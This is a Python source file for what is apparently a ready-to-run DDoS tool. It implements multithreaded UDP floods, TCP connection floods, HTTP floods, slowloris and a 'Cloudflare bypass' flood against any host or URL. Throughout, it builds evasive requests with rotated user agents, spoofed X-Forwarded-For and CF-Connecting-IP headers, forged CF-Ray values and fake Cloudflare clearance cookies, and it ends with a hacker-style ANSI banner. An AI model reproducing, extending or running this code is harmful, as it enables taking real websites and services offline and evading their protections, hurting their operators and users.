#!/usr/bin/env python3
import socket
import ssl
import threading
import time
import random
from typing import List, Dict, Optional
import sys
from urllib.parse import urlparse

class UserAgentRotator:
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.headers_pool = self._load_headers_pool()
        self.paths = self._load_paths()
        self.methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]

    def _load_user_agents(self):
        agents = []

        # Chrome versions
        chrome_versions = ["120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0",
                          "115.0.0.0", "114.0.0.0", "113.0.0.0", "112.0.0.0", "111.0.0.0",
                          "110.0.0.0", "109.0.0.0", "108.0.0.0", "107.0.0.0", "106.0.0.0",
                          "105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0",
                          "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0", "96.0.0.0"]

        os_templates = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Windows NT 6.3; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 10_14_6",
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
        ]

        for os_str in os_templates:
            for ver in chrome_versions:
                agents.append(f"Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36")

        # Firefox versions
        firefox_versions = ["121.0", "120.0", "119.0", "118.0", "117.0", "116.0", "115.0",
                           "114.0", "113.0", "112.0", "111.0", "110.0", "109.0", "108.0",
                           "107.0", "106.0", "105.0", "104.0", "103.0", "102.0", "101.0"]

        firefox_os = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 10.0; WOW64",
            "Macintosh; Intel Mac OS X 10.15",
            "X11; Linux x86_64",
            "X11; Ubuntu; Linux x86_64",
        ]

        for os_str in firefox_os:
            for ver in firefox_versions:
                agents.append(f"Mozilla/5.0 ({os_str}; rv:{ver}) Gecko/20100101 Firefox/{ver}")

        # Safari versions
        safari_versions = ["17.0", "16.6", "16.5", "16.4", "16.3", "16.2", "16.1", "16.0",
                          "15.6", "15.5", "15.4", "15.3", "15.2", "15.1", "15.0"]

        for ver in safari_versions:
            agents.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Safari/605.1.15")
            agents.append(f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Mobile/15E148 Safari/604.1")
            agents.append(f"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ver} Mobile/15E148 Safari/604.1")

        # Edge versions
        edge_versions = ["120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0"]
        for ver in edge_versions:
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/{ver}")

        # Mobile browsers
        mobile_agents = [
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        ]
        agents.extend(mobile_agents)

        # Opera, Brave, Vivaldi
        agents.extend([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.54",
        ])

        # Bot/crawler agents for mixed traffic
        agents.extend([
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
            "Slurp/3.0 (http://help.yahoo.com/help/us/ysearch/slurp)",
            "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        ])

        # Randomize and return
        random.shuffle(agents)
        return agents

    def _load_headers_pool(self):
        return [
            # Cloudflare bypass - modern browser headers with IP spoofing
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "X-Forwarded-For": "",  # Will be filled with random IP
                "X-Real-IP": "",
                "CF-Connecting-IP": "",
            },
            # Cloudflare bypass - Chrome with CF cookies
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": '"Chromium";v="120", "Google Chrome";v="120", "Not=A?Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
            # Cloudflare bypass - Firefox headers
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "TE": "trailers",
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
            # Cloudflare bypass - Safari headers
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
            # Cloudflare bypass - Mobile Chrome
            {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": '"Chromium";v="120", "Google Chrome";v="120", "Not=A?Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
            # API/AJAX requests
            {
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
            # Static resources
            {
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": "",
                "X-Real-IP": "",
            },
        ]

    def generate_random_ip(self) -> str:
        """Generate a random public IP address"""
        # Avoid private/reserved ranges
        while True:
            ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            # Skip private ranges
            if ip.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.",
                             "172.20.", "172.21.", "172.22.", "172.23.", "172.24.",
                             "172.25.", "172.26.", "172.27.", "172.28.", "172.29.",
                             "172.30.", "172.31.", "192.168.", "127.")):
                continue
            return ip

    def generate_ip_range(self, count: int = 5) -> List[str]:
        """Generate multiple random IPs for X-Forwarded-For chain"""
        return [self.generate_random_ip() for _ in range(count)]

    def _load_paths(self):
        return [
            "/", "/index.html", "/index.php", "/home", "/main",
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/users", "/api/data",
            "/login", "/register", "/signin", "/signup", "/auth",
            "/search", "/query", "/find", "/lookup",
            "/admin", "/administrator", "/wp-admin", "/dashboard", "/panel",
            "/assets/css", "/assets/js", "/assets/images",
            "/css/style.css", "/js/main.js", "/js/app.js",
            "/images/logo.png", "/images/banner.jpg", "/img/icon.png",
            "/favicon.ico", "/robots.txt", "/sitemap.xml", "/manifest.json",
            "/health", "/status", "/ping", "/metrics", "/info",
            "/download", "/upload", "/file", "/media",
            "/blog", "/news", "/article", "/post",
            "/product", "/item", "/shop", "/store",
            "/about", "/contact", "/help", "/support",
            "/privacy", "/terms", "/legal", "/policy",
            # Cloudflare bypass paths
            "/cdn-cgi/", "/cdn-cgi/challenge-platform/", "/cdn-cgi/scripts/",
            "/cdn-cgi/styles/", "/cdn-cgi/images/", "/cdn-cgi/rum/",
            "/cdn-cgi/trace", "/cdn-cgi/trace/",
            "/_next/", "/_nuxt/", "/static/", "/public/",
            "/wp-content/", "/wp-includes/", "/wp-json/",
            "/xmlrpc.php", "/wp-cron.php",
        ]

    def get_random_request(self, target: str, port: int, scheme: str = "http") -> str:
        ua = random.choice(self.user_agents)
        headers = random.choice(self.headers_pool).copy()
        path = random.choice(self.paths)
        method = random.choice(self.methods)

        # Cloudflare bypass: sometimes use specific paths that bypass CF
        cf_bypass_paths = [
            "/cdn-cgi/", "/cdn-cgi/challenge-platform/", "/cdn-cgi/scripts/",
            "/cdn-cgi/styles/", "/cdn-cgi/images/", "/cdn-cgi/rum/",
            "/api/", "/graphql", "/_next/", "/_nuxt/", "/static/",
            "/wp-content/", "/wp-includes/", "/xmlrpc.php",
        ]

        # 30% chance to use CF bypass paths
        if random.random() < 0.3:
            path = random.choice(cf_bypass_paths + self.paths)

        # IP Spoofing: Generate random IPs for forwarding headers
        spoofed_ip = self.generate_random_ip()
        ip_chain = self.generate_ip_range(random.randint(1, 5))

        # Build request
        request_lines = [
            f"{method} {path} HTTP/1.1",
            f"Host: {target}:{port}",
            f"User-Agent: {ua}",
        ]

        # Add headers in random order
        header_items = list(headers.items())
        random.shuffle(header_items)

        for key, value in header_items:
            if key == "Host":
                continue  # Already set
            if key == "User-Agent":
                continue  # Already set

            # IP Spoofing: Fill IP-related headers
            if key == "X-Forwarded-For":
                # Sometimes use single IP, sometimes chain
                if random.random() < 0.5:
                    value = spoofed_ip
                else:
                    value = ", ".join(ip_chain)
                request_lines.append(f"{key}: {value}")
            elif key == "X-Real-IP":
                value = spoofed_ip
                request_lines.append(f"{key}: {value}")
            elif key == "CF-Connecting-IP":
                value = spoofed_ip
                request_lines.append(f"{key}: {value}")
            elif value == "":  # Skip empty values
                continue
            else:
                request_lines.append(f"{key}: {value}")

        # Cloudflare bypass: Add CF-specific headers sometimes
        if random.random() < 0.3:
            cf_headers = [
                f"CF-Connecting-IP: {spoofed_ip}",
                f"CF-Ray: {''.join(random.choices('0123456789abcdef', k=16))}-{random.choice(['FRA', 'AMS', 'LHR', 'CDG', 'JFK', 'LAX'])}",
                "CF-Visitor: {\"scheme\":\"https\"}",
                f"CF-IPCountry: {random.choice(['US', 'GB', 'DE', 'FR', 'NL', 'JP', 'AU', 'CA'])}",
            ]
            request_lines.append(random.choice(cf_headers))

        # Sometimes add referer
        if random.random() < 0.4:
            request_lines.append(f"Referer: {scheme}://{target}/")

        # Cloudflare bypass: Add cookies sometimes
        cf_cookies = [
            "__cf_bm=",
            "cf_clearance=",
            "_cfuvid=",
            "__cfruid=",
        ]

        if random.random() < 0.3:
            # Generate fake CF cookies
            cookie_name = random.choice(cf_cookies)
            cookie_value = "".join(random.choices("0123456789abcdef", k=32))
            request_lines.append(f"Cookie: {cookie_name}{cookie_value}")
        elif random.random() < 0.2:
            # Regular session cookies with spoofed IP context
            cookie = f"session={random.randint(1000000, 9999999)}; user_id={random.randint(1, 1000)}; ip={spoofed_ip}"
            request_lines.append(f"Cookie: {cookie}")

        # Add body for POST/PUT
        if method in ["POST", "PUT"] and random.random() < 0.5:
            body = f"data={random.randint(1, 1000)}&action=submit&ip={spoofed_ip}"
            request_lines.append(f"Content-Type: application/x-www-form-urlencoded")
            request_lines.append(f"Content-Length: {len(body)}")
            request_lines.append("")
            request_lines.append(body)

        request = "\r\n".join(request_lines) + "\r\n\r\n"
        return request


class DDoSAttack:
    def __init__(self, target: str, port: int, threads: int = 100, requests: int = 0,
                 byte_size: int = 1024, duration: int = 0, rotator: UserAgentRotator = None, scheme: str = "http"):
        self.target = target
        self.port = port
        self.threads = threads
        self.requests = requests
        self.byte_size = byte_size
        self.duration = duration
        self.running = False
        self.attack_threads: List[threading.Thread] = []
        self.request_counter = 0
        self.counter_lock = threading.Lock()
        self.start_time = None
        self.rotator = rotator or UserAgentRotator()
        self.scheme = scheme

    def udp_flood(self):
        # UDP max payload is ~65507 bytes, but we limit to safe size
        max_udp_size = 60000
        payload_size = min(self.byte_size, max_udp_size)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Pre-generate payload for better performance
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))

        sent = 0
        errors = 0
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock.sendto(payload, (self.target, self.port))
                sent += 1
                if sent % 10000 == 0:
                    print(f"[UDP-{threading.current_thread().name}] Sent {sent} packets")
            except Exception as e:
                errors += 1
                if errors > 100:
                    print(f"[UDP-{threading.current_thread().name}] Too many errors, stopping")
                    break
                # Small delay on error to avoid tight loop
                time.sleep(0.01)
        sock.close()
        print(f"[UDP-{threading.current_thread().name}] Finished - sent {sent} packets, errors: {errors}")

    def tcp_syn_flood(self):
        sent = 0
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((self.target, self.port))
                time.sleep(0.005)
                sock.close()
                sent += 1
                if sent % 1000 == 0:
                    print(f"[TCP-{threading.current_thread().name}] Sent {sent} SYNs")
            except Exception:
                pass
        print(f"[TCP-{threading.current_thread().name}] Finished - sent {sent} SYNs")

    def http_flood(self):
        sent = 0
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, self.port))

                if self.scheme == "https":
                    sock = context.wrap_socket(sock, server_hostname=self.target)

                request = self.rotator.get_random_request(self.target, self.port, self.scheme)
                sock.send(request.encode())
                sock.close()
                sent += 1

                if sent % 500 == 0:
                    print(f"[HTTP-{threading.current_thread().name}] Sent {sent} requests")
            except Exception:
                pass
        print(f"[HTTP-{threading.current_thread().name}] Finished - sent {sent} requests")

    def slowloris(self):
        sockets = []
        sent = 0
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Initial connection burst
        for _ in range(min(200, self.threads)):
            if not self.running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target, self.port))

                if self.scheme == "https":
                    s = context.wrap_socket(s, server_hostname=self.target)

                request = self.rotator.get_random_request(self.target, self.port, self.scheme)
                s.send(request.encode())
                sockets.append(s)
            except Exception:
                pass

        print(f"[Slowloris] Established {len(sockets)} connections")

        # Keep connections alive
        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            for s in sockets[:]:
                try:
                    s.send(b"X-a: b\r\n")
                    sent += 1
                except Exception:
                    sockets.remove(s)
                    # Try to reconnect
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(10)
                        new_s.connect((self.target, self.port))

                        if self.scheme == "https":
                            new_s = context.wrap_socket(new_s, server_hostname=self.target)

                        request = self.rotator.get_random_request(self.target, self.port, self.scheme)
                        new_s.send(request.encode())
                        sockets.append(new_s)
                    except Exception:
                        pass
            time.sleep(10)

        for s in sockets:
            try:
                s.close()
            except:
                pass
        print(f"[Slowloris] Finished - sent {sent} keep-alives")

    def cf_bypass_flood(self):
        """Cloudflare bypass flood - uses CF-specific paths and headers with IP spoofing"""
        sent = 0
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Cloudflare-specific paths that often bypass protection
        cf_paths = [
            "/cdn-cgi/", "/cdn-cgi/challenge-platform/", "/cdn-cgi/scripts/",
            "/cdn-cgi/styles/", "/cdn-cgi/images/", "/cdn-cgi/rum/",
            "/cdn-cgi/trace", "/cdn-cgi/trace/",
            "/api/", "/graphql", "/_next/", "/_nuxt/", "/static/",
            "/wp-content/", "/wp-includes/", "/xmlrpc.php",
        ]

        while self.running:
            if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                break
            if self.requests > 0:
                with self.counter_lock:
                    if self.request_counter >= self.requests:
                        break
                    self.request_counter += 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, self.port))

                if self.scheme == "https":
                    sock = context.wrap_socket(sock, server_hostname=self.target)

                # IP Spoofing
                spoofed_ip = self.rotator.generate_random_ip()
                ip_chain = self.rotator.generate_ip_range(random.randint(1, 5))

                # Force CF bypass path
                ua = random.choice(self.rotator.user_agents)
                headers = random.choice(self.rotator.headers_pool).copy()
                path = random.choice(cf_paths)
                method = random.choice(["GET", "HEAD", "OPTIONS"])

                request_lines = [
                    f"{method} {path} HTTP/1.1",
                    f"Host: {self.target}:{self.port}",
                    f"User-Agent: {ua}",
                ]

                # Add Cloudflare-specific headers
                header_items = list(headers.items())
                random.shuffle(header_items)
                for key, value in header_items:
                    if key in ["Host", "User-Agent"]:
                        continue

                    # IP Spoofing headers
                    if key == "X-Forwarded-For":
                        if random.random() < 0.5:
                            value = spoofed_ip
                        else:
                            value = ", ".join(ip_chain)
                        request_lines.append(f"{key}: {value}")
                    elif key == "X-Real-IP":
                        request_lines.append(f"{key}: {spoofed_ip}")
                    elif key == "CF-Connecting-IP":
                        request_lines.append(f"{key}: {spoofed_ip}")
                    elif value == "":
                        continue
                    else:
                        request_lines.append(f"{key}: {value}")

                # CF-specific headers with spoofed IP
                cf_headers = [
                    f"CF-Connecting-IP: {spoofed_ip}",
                    f"CF-Ray: {''.join(random.choices('0123456789abcdef', k=16))}-{random.choice(['FRA', 'AMS', 'LHR', 'CDG', 'JFK', 'LAX', 'SIN', 'NRT'])}",
                    "CF-Visitor: {\"scheme\":\"https\"}",
                    f"CF-IPCountry: {random.choice(['US', 'GB', 'DE', 'FR', 'NL', 'JP', 'AU', 'CA', 'SG', 'KR'])}",
                ]
                request_lines.append(random.choice(cf_headers))

                # CF cookies with spoofed IP
                if random.random() < 0.5:
                    cf_cookies = ["__cf_bm", "cf_clearance", "_cfuvid", "__cfruid"]
                    cookie_name = random.choice(cf_cookies)
                    cookie_value = "".join(random.choices("0123456789abcdef", k=32))
                    request_lines.append(f"Cookie: {cookie_name}={cookie_value}; ip={spoofed_ip}")

                request = "\r\n".join(request_lines) + "\r\n\r\n"
                sock.send(request.encode())
                sock.close()
                sent += 1

                if sent % 500 == 0:
                    print(f"[CF-BYPASS-{threading.current_thread().name}] Sent {sent} requests")
            except Exception:
                pass
        print(f"[CF-BYPASS-{threading.current_thread().name}] Finished - sent {sent} requests")

    def start(self, attack_type: str = "udp"):
        self.running = True
        self.start_time = time.time()
        print(f"[+] Starting {attack_type.upper()} attack on {self.target}:{self.port}")
        print(f"[+] User agents loaded: {len(self.rotator.user_agents)}")
        print(f"[+] Header templates: {len(self.rotator.headers_pool)}")
        print(f"[+] Paths: {len(self.rotator.paths)}")

        attack_func = {
            "udp": self.udp_flood,
            "tcp": self.tcp_syn_flood,
            "http": self.http_flood,
            "slowloris": self.slowloris,
            "cf-bypass": self.cf_bypass_flood
        }.get(attack_type, self.udp_flood)

        # For cf-bypass, use fewer threads (more stealthy)
        if attack_type == "cf-bypass":
            thread_count = min(self.threads, 50)
            print(f"[+] CF-BYPASS mode: Using {thread_count} threads (stealth mode)")
        else:
            thread_count = self.threads
            print(f"[+] Using {thread_count} threads")

        print(f"[+] Spawning {thread_count} threads...")
        for i in range(thread_count):
            thread = threading.Thread(target=attack_func, name=f"Attack-{i}")
            thread.start()
            self.attack_threads.append(thread)
        print(f"[+] All {len(self.attack_threads)} threads started")

    def stop(self):
        self.running = False
        print("[+] Stopping attack...")
        for thread in self.attack_threads:
            thread.join(timeout=1)
        self.attack_threads.clear()
        print("[+] Attack stopped")


def parse_target(target_input: str) -> tuple:
    """Parse target input - can be IP, hostname, or URL"""
    # Check if it's a URL
    if target_input.startswith(('http://', 'https://')):
        parsed = urlparse(target_input)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        scheme = parsed.scheme
        return hostname, port, scheme

    # Check if it has port specified (host:port)
    if ':' in target_input and not target_input.startswith('http'):
        parts = target_input.split(':')
        if len(parts) == 2:
            try:
                port = int(parts[1])
                return parts[0], port, "http"
            except ValueError:
                pass

    # Default to port 80
    return target_input, 80, "http"


def validate_target(target: str) -> bool:
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        pass

    try:
        socket.gethostbyname(target)
        return True
    except socket.gaierror:
        print(f"[!] Could not resolve hostname: {target}")
        print(f"[!] Try using the direct IP address instead")
        return False


def print_banner():
    banner = """
\x1b[0;97m \x1b[0;31m██\x1b[0;97m \x1b[0;31m▄█▀\x1b[0;37m \x1b[0;97m \x1b[0;31m██▓\x1b[0;37m \x1b[0;97m \x1b[0;31m██▓\x1b[0;37m     \x1b[0;97m \x1b[0;31m██▓\x1b[0;37m     \x1b[0;31m▓\x1b[0;97;41m ▄▄\x1b[0;31m██\x1b[0;37m  \x1b[0;97m \x1b[0;31m██\x1b[0;97m \x1b[0;31m███\x1b[0;37m   \x1b[0;97m  \x1b[0;97;41m ▄▄\x1b[0;31m██\x1b[0;37m   \x1b[0;31m▓\x1b[0;97;41m ▄▄\x1b[0;31m██\x1b[0;37m  \x1b[0;97m \x1b[0;31m▄█\x1b[0;97;41m▄  \x1b[0;31m▄\x1b[0;37m  \x1b[0m
\x1b[0;97m \x1b[0;97;41m█\x1b[0;31m█▄█▒\x1b[0;37m  \x1b[0;31m▓\x1b[0;97;41m▐\x1b[0;31m█▒\x1b[0;37m \x1b[0;31m▓██▒\x1b[0;37m     \x1b[0;31m▓██▒\x1b[0;37m     \x1b[0;31m▓\x1b[0;97;41m█ \x1b[0;97m  \x1b[0;31m▀\x1b[0;37m  \x1b[0;31m▓\x1b[0;97;41m█\x1b[0;31m█\x1b[0;97m \x1b[0;31m▒\x1b[0;97m \x1b[0;31m██▓\x1b[0;37m \x1b[0;31m▒\x1b[0;97;41m ▀\x1b[0;97m   \x1b[0;31m▒\x1b[0;37m   \x1b[0;31m▓\x1b[0;97;41m█ \x1b[0;97m  \x1b[0;31m▀\x1b[0;37m  \x1b[0;31m▓\x1b[0;97;41m █\x1b[0;31m▀\x1b[0;97m \x1b[0;31m▀█\x1b[0;37m  \x1b[0m
\x1b[0;31m▓\x1b[0;97;41m█\x1b[0;31m██▄░\x1b[0;37m  \x1b[0;31m▒\x1b[0;97;41m \x1b[0;31m█▒\x1b[0;37m \x1b[0;31m▒\x1b[0;97;41m█\x1b[0;31m█░\x1b[0;37m     \x1b[0;31m▒\x1b[0;97;41m█\x1b[0;31m█░\x1b[0;37m     \x1b[0;31m▒▓█\x1b[0;97m  \x1b[0;31m▄\x1b[0;37m  \x1b[0;31m▒\x1b[0;97;41m▄\x1b[0;31m█▀▀█▄\x1b[0;37m   \x1b[0;97m  \x1b[0;31m▒\x1b[0;97m \x1b[0;31m  \x1b[0;97;41m▄\x1b[0;31m█▓\x1b[0;37m \x1b[0;31m▒▓█\x1b[0;97m  \x1b[0;31m▄\x1b[0;37m  \x1b[0;31m▒▒▒▄\x1b[0;97m \x1b[0;31m▄\x1b[0;97;41m  \x1b[0;31m▒\x1b[0m
\x1b[0;31m▓\x1b[0;97;41m█\x1b[0;31m█\x1b[0;97m \x1b[0;31m█▄\x1b[0;37m  \x1b[0;31m░\x1b[0;97;41m▐ \x1b[0;31m░\x1b[0;37m \x1b[0;31m▒\x1b[0;97;41m█ \x1b[0;31m░\x1b[0;37m     \x1b[0;31m▒\x1b[0;97;41m█ \x1b[0;31m░\x1b[0;37m     \x1b[0;31m▒▓█\x1b[0;97m  \x1b[0;31m▄\x1b[0;37m  \x1b[0;31m▒\x1b[0;97;41m▄\x1b[0;31m█▀▀█▄\x1b[0;37m   \x1b[0;97m  \x1b[0;31m▒\x1b[0;97m \x1b[0;31m  \x1b[0;97;41m▄\x1b[0;31m█▓\x1b[0;37m \x1b[0;31m▒▓█\x1b[0;97m  \x1b[0;31m▄\x1b[0;37m  \x1b[0;31m▒▒▒▄\x1b[0;97m \x1b[0;31m▄\x1b[0;97;41m  \x1b[0;31m▒\x1b[0m
\x1b[0;31m▒\x1b[0;97;41m▄\x1b[0;31m█▓\x1b[0;97m \x1b[0;31m█▄\x1b[0;37m \x1b[0;31m░\x1b[0;97;41m▐\x1b[0;31m█░\x1b[0;37m \x1b[0;31m░\x1b[0;97;41m▄\x1b[0;31m█████▒\x1b[0;37m \x1b[0;31m░\x1b[0;97;41m▄\x1b[0;31m█████▒\x1b[0;37m \x1b[0;31m░▒████▒\x1b[0;37m \x1b[0;31m░██▓\x1b[0;97m \x1b[0;31m▒██▒\x1b[0;37m \x1b[0;31m▓███\x1b[0;97;41m▄▄▀\x1b[0;31m▒▒\x1b[0;37m \x1b[0;31m░▒████▒\x1b[0;37m \x1b[0;31m▒ ▒\x1b[0;97;41m   \x1b[0;31m▀\x1b[0;97m \x1b[0;31m░\x1b[0m
\x1b[0;31m▒\x1b[0;97m \x1b[0;31m▒▒\x1b[0;97m \x1b[0;31m▓▒\x1b[0;37m \x1b[0;31m░▓\x1b[0;37m   \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒░▓\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒░▓\x1b[0;97m  \x1b[0;31m░\x1b[0;37m \x1b[0;31m░░\x1b[0;97m \x1b[0;31m▒░\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m▒▓\x1b[0;97m \x1b[0;31m░▒▓░\x1b[0;37m \x1b[0;31m▒\x1b[0;97m \x1b[0;31m▒▓▒\x1b[0;97m \x1b[0;31m▒\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;31m░░\x1b[0;97m \x1b[0;31m▒░\x1b[0;97m \x1b[0;31m░\x1b[0;37m \x1b[0;31m░\x1b[0;97m \x1b[0;31m░▒\x1b[0;97m \x1b[0;31m▓\x1b[0;97m  \x1b[0;31m░\x1b[0m
